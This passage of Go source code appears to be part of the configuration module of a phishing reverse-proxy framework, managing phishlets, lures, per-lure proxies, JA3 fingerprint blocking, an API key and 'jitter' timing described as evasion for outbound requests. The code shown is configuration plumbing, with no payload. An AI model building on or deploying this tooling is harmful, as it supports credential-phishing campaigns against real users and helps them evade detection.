	log.Info("added JA3 to blocked list: %s", ja3)
	c.cfg.WriteConfig()
}

// --- API Config ---

func (c *Config) IsApiEnabled() bool {
	if c.apiConfig == nil {
		return false
	}
	return c.apiConfig.Enabled
}

func (c *Config) SetApiEnabled(enabled bool) {
	c.apiConfig.Enabled = enabled
	c.cfg.Set(CFG_API, c.apiConfig)
	if enabled {
		log.Info("API enabled")
	} else {
		log.Info("API disabled")
	}
	c.cfg.WriteConfig()
}

func (c *Config) GetApiKey() string {
	if c.apiConfig == nil {
		return ""
	}
	return c.apiConfig.ApiKey
}

func (c *Config) SetApiKey(key string) {
	c.apiConfig.ApiKey = key
	c.cfg.Set(CFG_API, c.apiConfig)
	log.Info("API key set")
	c.cfg.WriteConfig()
}

func (c *Config) GetApiSecretPath() string {
	if c.apiConfig == nil {
		return ""
	}
	return c.apiConfig.SecretPath
}

func (c *Config) SetApiSecretPath(path string) {
	c.apiConfig.SecretPath = path
	c.cfg.Set(CFG_API, c.apiConfig)
	log.Info("API secret path set to: %s", path)
	c.cfg.WriteConfig()
}

// --- Jitter Config (timing evasion for outbound requests) ---

func (c *Config) IsJitterEnabled() bool {
	if c.jitterConfig == nil {
		return false
	}
	return c.jitterConfig.Enabled
}

func (c *Config) SetJitterEnabled(enabled bool) {
	if c.jitterConfig == nil {
		c.jitterConfig = &JitterConfig{Enabled: true, MinMs: 100, MaxMs: 300}
	}
	c.jitterConfig.Enabled = enabled
	c.cfg.Set(CFG_JITTER, c.jitterConfig)
	if enabled {
		log.Info("jitter enabled (%d-%d ms on outbound requests)", c.jitterConfig.MinMs, c.jitterConfig.MaxMs)
	} else {
		log.Info("jitter disabled")
	}
	c.cfg.WriteConfig()
}

func (c *Config) GetJitterMinMs() int {
	if c.jitterConfig == nil {
		return 100
	}
	return c.jitterConfig.MinMs
}

func (c *Config) GetJitterMaxMs() int {
	if c.jitterConfig == nil {
		return 300
	}
	return c.jitterConfig.MaxMs
}

// --- Notifier Config ---

func (c *Config) GetNotifiers() []*NotifierConfig {
	return c.notifiers
}

func (c *Config) AddNotifier(n *NotifierConfig) {
	c.notifiers = append(c.notifiers, n)
	c.cfg.Set(CFG_NOTIFIERS, c.notifiers)
	log.Info("added notifier: %s (%s)", n.Name, n.Type)
	c.cfg.WriteConfig()
}

func (c *Config) DeleteNotifier(name string) error {
	idx := -1
	for i, n := range c.notifiers {
		if n.Name == name {
			idx = i
			break
		}
	}
	if idx == -1 {
		return fmt.Errorf("notifier '%s' not found", name)
	}
	c.notifiers = append(c.notifiers[:idx], c.notifiers[idx+1:]...)
	c.cfg.Set(CFG_NOTIFIERS, c.notifiers)
	log.Info("deleted notifier: %s", name)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) GetNotifier(name string) (*NotifierConfig, error) {
	for _, n := range c.notifiers {
		if n.Name == name {
			return n, nil
		}
	}
	return nil, fmt.Errorf("notifier '%s' not found", name)
}

func (c *Config) SaveNotifiers() {
	c.cfg.Set(CFG_NOTIFIERS, c.notifiers)
	c.cfg.WriteConfig()
}

// --- Named Proxy Config ---

func (c *Config) GetNamedProxies() []*NamedProxy {
	return c.namedProxies
}

func (c *Config) GetNamedProxy(name string) (*NamedProxy, error) {
	for _, np := range c.namedProxies {
		if np.Name == name {
			return np, nil
		}
	}
	return nil, fmt.Errorf("proxy '%s' not found", name)
}

func (c *Config) AddNamedProxy(np *NamedProxy) error {
	for _, existing := range c.namedProxies {
		if existing.Name == np.Name {
			return fmt.Errorf("proxy '%s' already exists", np.Name)
		}
	}
	c.namedProxies = append(c.namedProxies, np)
	c.cfg.Set(CFG_NAMED_PROXIES, c.namedProxies)
	log.Info("created proxy: %s", np.Name)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) DeleteNamedProxy(name string) error {
	idx := -1
	for i, np := range c.namedProxies {
		if np.Name == name {
			idx = i
			break
		}
	}
	if idx == -1 {
		return fmt.Errorf("proxy '%s' not found", name)
	}
	c.namedProxies = append(c.namedProxies[:idx], c.namedProxies[idx+1:]...)
	c.cfg.Set(CFG_NAMED_PROXIES, c.namedProxies)
	log.Info("deleted proxy: %s", name)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) SaveNamedProxies() {
	c.cfg.Set(CFG_NAMED_PROXIES, c.namedProxies)
	c.cfg.WriteConfig()
}

// --- Encryption Key ---

func (c *Config) GetEncKey() string {
	return c.general.EncKey
}

func (c *Config) SetEncKey(key string) {
	c.general.EncKey = key
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("encryption key set")
	c.cfg.WriteConfig()
}

// --- Server Name ---

func (c *Config) GetServerName() string {
	return c.general.ServerName
}

func (c *Config) SetServerName(name string) {
	c.general.ServerName = name
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server name set to: %s", name)
	c.cfg.WriteConfig()
}

// --- Per-phishlet domain ---

func (c *Config) SetPhishletDomain(site string, domain string) bool {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set domain")
		return false
	}
	c.PhishletConfig(site).Domain = domain
	c.SavePhishlets()
	log.Info("phishlet '%s' domain set to: %s", site, domain)
	return true
}

func (c *Config) GetPhishletDomain(site string) string {
	if o, ok := c.phishletConfig[site]; ok {
		if o.Domain != "" {
			return o.Domain
		}
	}
	return c.general.Domain
}

// --- Per-phishlet/lure proxy ---

func (c *Config) SetPhishletProxy(site string, proxyName string) bool {
	_, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if proxyName != "" {
		np, err := c.GetNamedProxy(proxyName)
		if err != nil {
			log.Error("%v", err)
			return false
		}
		if np.Address == "" || np.Port == 0 {
			log.Warning("proxy '%s' has no address/port configured - traffic will go DIRECT until configured!", proxyName)
			log.Warning("configure with: proxy set %s address=<addr> and proxy set %s port=<port>", proxyName, proxyName)
		}
	}
	c.PhishletConfig(site).Proxy = proxyName
	c.SavePhishlets()
	if proxyName != "" {
		log.Info("phishlet '%s' proxy set to: %s", site, proxyName)
	} else {
		log.Info("phishlet '%s' proxy cleared", site)
	}
	return true
}

func (c *Config) SetLureProxy(index int, proxyName string) error {
	if index < 0 || index >= len(c.lures) {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	if proxyName != "" {
		np, err := c.GetNamedProxy(proxyName)
		if err != nil {
			return err
		}
		if np.Address == "" || np.Port == 0 {
			log.Warning("proxy '%s' has no address/port configured - traffic will go DIRECT until configured!", proxyName)
		}
	}
	c.lures[index].Proxy = proxyName
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) GetLures() []*Lure {
	return c.lures
}

func (c *Config) GetLureIds() []string {
	return c.lureIds
}
